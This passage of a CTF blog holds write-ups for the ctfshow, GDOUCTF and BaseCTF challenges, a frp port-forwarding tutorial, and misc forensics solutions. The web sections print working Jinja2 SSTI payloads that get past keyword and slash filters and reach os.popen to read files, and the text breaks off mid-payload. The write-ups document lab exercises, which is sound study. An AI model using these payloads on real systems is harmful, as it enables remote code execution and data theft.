        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ctfshow愚人杯-easy-ssti"><a href="#ctfshow愚人杯-easy-ssti" class="headerlink" title="ctfshow愚人杯 easy_ssti"></a>ctfshow愚人杯 easy_ssti</h2><blockquote><p>考点：ssti漏洞（<strong>见笔记</strong>）</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195417125.png" alt="image-20240911195417125"></p><blockquote><p>查看源码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195446013.png" alt="image-20240911195446013"></p><blockquote><p>下载这个文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195520690.png" alt="image-20240911195520690"></p><blockquote><p>打开查看代码，分析可能在/hello/路径下存在ssti漏洞</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hellodear</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进行<span class="template-variable">&#123;&#123;&#125;&#125;</span>测试，发现真是</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911195713451.png" alt="image-20240911195713451"></p><blockquote><p>剩下的就是按照笔记那样的步骤一步一步走就行</p><p>重点强调一下如何找<class 'os._wrap_close'></p><p>1.先找到其位置</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200145243.png" alt="image-20240911200145243"></p><blockquote><p>2.查询<class ，再选中<class 'os._wrap_close'></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200237432.png" alt="image-20240911200237432"></p><blockquote><p>3.上下查询即可看到第几个。下标就是再-1。这里就是133-1=132.</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200338927.png" alt="image-20240911200338927"></p><blockquote><p>这道题在执行cat /flag命令时会Not Found。</p><p>猜测了一下，应该是将语句中的”/“当成目录了。</p><p>那就试试base64+管道符绕过。</p><p>注意要包一层反引号（命令执行），不然会被当做字符串echo出来。</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">(</span>&#x27;cat /fl*&#x27;<span class="punctuation">)</span>替换成<span class="punctuation">(</span>&#x27; ` echo Y2F0IC9mKg== | base64 -d ` &#x27;<span class="punctuation">)</span></span><br></pre></td></tr></table></figure><blockquote><p>最后得到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911200749213.png" alt="image-20240911200749213"></p><h2 id="GDOUCTF-2023"><a href="#GDOUCTF-2023" class="headerlink" title="[GDOUCTF 2023]"></a>[GDOUCTF 2023]<ez_ze></h2><blockquote><p>考点：ssti漏洞，fenjing一把梭</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911204933643.png" alt="image-20240911204933643"></p><blockquote><p>输入1111，试试看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911205018866.png" alt="image-20240911205018866"></p><blockquote><p>表面在/get_flag路径下可能存在ssti漏洞。方法是post，变量是name。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911205753411.png" alt="image-20240911205753411"></p><blockquote><p>直接使用fenjing工具拿到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911210006897.png" alt="image-20240911210006897"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911210026354.png" alt="image-20240911210026354"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量代理和frp使用</title>
      <link href="/posts/502156a3.html"/>
      <url>/posts/502156a3.html</url>
      
        <content type="html"><![CDATA[<p>流量代理:<a href="https://blog.csdn.net/zkaqlaoniao/article/details/138181219">https://blog.csdn.net/zkaqlaoniao/article/details/138181219</a></p><p>frp实现内网端口转发<a href="https://www.cnblogs.com/xuanlvsec/p/13723495.html">https://www.cnblogs.com/xuanlvsec/p/13723495.html</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145017.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>frp 是一个高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><ul><li>利用处于防火墙后的机器，对外网环境提供 http 或 https 服务。</li><li>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</li><li>利用处于防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司局部环境的主机。</li></ul><p>（摘自百度百科）</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>准备一台内网windows服务器虚拟机</p><p>一台公网服务器</p><p>一台pc（不要是windows虚拟机的宿主机）</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内网windows服务器         <span class="number">192</span><span class="number">.168</span><span class="number">.244</span><span class="number">.130</span></span><br><span class="line">公网linux服务器           <span class="number">152</span>.<span class="keyword">X</span>.<span class="keyword">X</span>.<span class="keyword">X</span></span><br></pre></td></tr></table></figure><p>设置内网Windows服务器防火墙不放行3389端口</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924102912758-167415936.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2163870-20200924102912758-167415936.png" alt="img"></a></p><h2 id="frp下载"><a href="#frp下载" class="headerlink" title="frp下载"></a>frp下载</h2><p>Github地址:<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>本次试验用的是一台linux服务器和一台windows服务器，下载的时候记得下载对应操作系统</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">frp_0</span>.<span class="number">34</span>.<span class="number">0</span>_windows_amd64.zip</span><br><span class="line"><span class="attribute">frp_0</span>.<span class="number">34</span>.<span class="number">0</span>_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="开整"><a href="#开整" class="headerlink" title="开整"></a>开整</h2><p>本次的试验目的是在另一台pc上连接内网服务器的3389端口，在环境搭建阶段我们已经将防火墙打开，而且由于pc和内网服务器不在同一网段，所以是无法直接连3389的，因此，我们需要将内网服务器的3389转发出来，转发到公网服务器的一个端口上，这样我们通过连接公网服务器的某个端口，就可以访问内网服务器的3389了。整个流程如下。（没啥专业的画图软件只能用windwos自带的画图了，原谅我的灵魂画术）</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924105019581-737106838.png"><img src="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924105019581-737106838.png" alt="img"></a></p><p> <strong>第一步 将frp上传到公网服务器和内网服务器上</strong></p><p> 将对应操作系统的包分别上传到两台服务器上</p><p><strong>第二步 配置客户端及服务端，并启动</strong></p><p>我们将window服务器作为客户端，公网服务器作为服务端</p><p>先配置服务端</p><p>编辑frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p>打开文件默认就是这个，不用动，保持这样就行，这是配置服务端的端口，然后用下面的命令启动服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p>启动完了以后先放着，再配置客户端</p><p>编辑Windows服务器上的frpc.ini,做如下配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">152</span>.x.x.x     <span class="comment">#服务端ip，也就是公网服务器ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span>          <span class="comment">#服务器端口</span></span><br><span class="line"><span class="section">[ssh]</span>                       <span class="comment">#这个是节点名称，可以随便写</span></span><br><span class="line"><span class="attr">type</span> = tcp                  <span class="comment">#通信协议</span></span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span>        <span class="comment">#本地地址</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">3389</span>           <span class="comment">#要转发的端口</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span>          <span class="comment">#要转发到的远程端口</span></span><br></pre></td></tr></table></figure><p>配置完成后，运行以下命令启动客户端</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -<span class="keyword">c</span> frpc.ini</span><br></pre></td></tr></table></figure><p>随后就能看到服务端显示有新的客户端连进来了</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120358152-425470860.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2163870-20200924120358152-425470860.png" alt="img"></a></p><p> <strong>第三步 连接远程桌面</strong></p><p>使用pc连接公网服务器的6000端口，连接成功</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120845320-361076319.png"><img src="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120845320-361076319.png" alt="img"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>内网端口转发和反向隧道的建立大多数工具都是这种方式，内网做客户端主动向外网服务端通信，了解了这种方式就能更好的理解大多数端口转发的操作了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF-week3-wp</title>
      <link href="/posts/7f421f2e.html"/>
      <url>/posts/7f421f2e.html</url>
      
        <content type="html"><![CDATA[<h1 id="BaseCTF-week3-wp"><a href="#BaseCTF-week3-wp" class="headerlink" title="BaseCTF-week3-wp"></a>BaseCTF-week3-wp</h1><p>[TOC]</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="Week3-broken-mp4"><a href="#Week3-broken-mp4" class="headerlink" title="[Week3] broken.mp4"></a>[Week3] broken.mp4</h4><p>考点：破损的mp4，untrunc工具</p><p>下载附件，是一个完整的mp4和一个破损的mp4，用untrunc工具进行修复破损的mp4，播放视频就能看到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911000105138.png" alt="image-20240911000105138"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911000315052.png" alt="image-20240911000315052"></p><h4 id="Week3-我要吃火腿！"><a href="#Week3-我要吃火腿！" class="headerlink" title="[Week3] 我要吃火腿！"></a>[Week3] 我要吃火腿！</h4><p>考点：兽音解密，python代码审计，破损文件修复，文件分离，SSTV</p><p>下载附件，解压。有一个破损的jpg文件和一个txt文件。打开txt文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224023855.png" alt="image-20240911224023855"></p><p>发现是兽音，在线直接解密。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224225507.png" alt="image-20240911224225507"></p><p>得到一串python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor_with_ham</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    ham_bytes = [<span class="number">0x48</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        data[i] ^= ham_bytes[i % <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line">xor_with_ham(<span class="string">&#x27;Hamorl.jpg&#x27;</span>, <span class="string">&#x27;Ham.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>代码审计，发现是进行了异或运算。异或运算具有对称性，即对某个数据进行两次相同的异或操作后，结果会还原为原始数据，换一下处理对象，再运行一边就ok——</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">xor_with_ham</span><span class="params">(<span class="string">&#x27;Ham.jpg&#x27;</span>, <span class="string">&#x27;Hamorl.jpg&#x27;</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224432266.png" alt="image-20240911224432266"></p><p>得到图片，放进010editor里看看。发现隐藏了wav文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224611885.png" alt="image-20240911224611885"></p><p>kali机里用foremost分离出来，得到一个音频。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224716250.png" alt="image-20240911224716250"></p><p>播放发现是刺耳的刺啦刺啦声，猜测是SSTV。使用MMSSTV工具，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911223740370.png" alt="image-20240911223740370"></p><h4 id="Week3-纯鹿人"><a href="#Week3-纯鹿人" class="headerlink" title="[Week3] 纯鹿人"></a>[Week3] 纯鹿人</h4><p>考点：文件分离</p><p>下载附件是个docx文件，查看，将图片移动一下，ctrl+a全选，发现猫腻</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912215749109.png" alt="image-20240912215749109"></p><p>换个字体颜色，看到一串base64代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912215820604.png" alt="image-20240912215820604"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912215841006.png" alt="image-20240912215841006"></p><p>盲猜password应该是个压缩包的，把docx文件放进010查看一下。确认是压缩包。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912215937669.png" alt="image-20240912215937669"></p><p>改后缀名后解压，找到里面唯一的图片。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912220017703.png" alt="image-20240912220017703"></p><p>放进010查看，发现隐藏压缩包文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912220102159.png" alt="image-20240912220102159"></p><p>进行文件分离，提取出压缩包，密码就是上面的密码，最后得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912220202811.png" alt="image-20240912220202811"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h4><p>经典的SSTI，过滤了一些关键字和一些符号，经过测试，过滤了以下符号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * / . &#123;&#123; &#125;&#125; __ : &quot; \</span><br></pre></td></tr></table></figure><p>先是使用继承链走到 RCE</p><p>过滤了 <code>.</code> ，可以用中括号绕，过滤了关键字，可以在关键字中间插入一对单引号 <code>&#39;&#39;</code></p><p>寻找能 RCE 的类，比如 ``</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>])%&#125;</span><br></pre></td></tr></table></figure><p>接着使用这个类里的 <code>popen</code> 函数来 RCE</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;pwd&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>因为过滤了斜杠和反斜杠，无法直接跳到根目录，这里提供三个方法来获取斜杠来跳到根目录</p><p>法一：利用 chr 函数来构造出一个命令</p><p>先找到 chr</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set chr= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_bui&#x27;</span><span class="string">&#x27;ltins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]%&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span>(chr) %&#125;</span><br></pre></td></tr></table></figure><p>接着用 chr 搭配上数字构造出想要执行的命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set chr= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_bui&#x27;</span><span class="string">&#x27;ltins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]%&#125;</span><br><span class="line">&#123;% set cmd=<span class="string">&#x27;cat &#x27;</span>~chr(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](cmd)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>最后把 cmd 作为 popen 的参数传递进去，即可得到 flag</p><p>同理，利用 format 来得到 <code>/</code> 也是可以的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set cmd=<span class="string">&#x27;cat &#x27;</span>~<span class="string">&#x27;%c&#x27;</span>%(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](cmd)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>法二：利用环境变量的值</p><p>查看环境变量，可以看到 <code>OLDPWD=/</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>此时可以直接利用它来切换到根目录，然后再读flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cd $OLDPWD;cat flag&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>法三：利用 <code>expr substr</code> 切割出一个 <code>/</code></p><p>比如 pwd 中的第一个字符就是 <code>/</code> ，那用 <code>expr substr</code> 切割出来后，之后就可以像法二那样切换到根目录然后读 flag 了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span 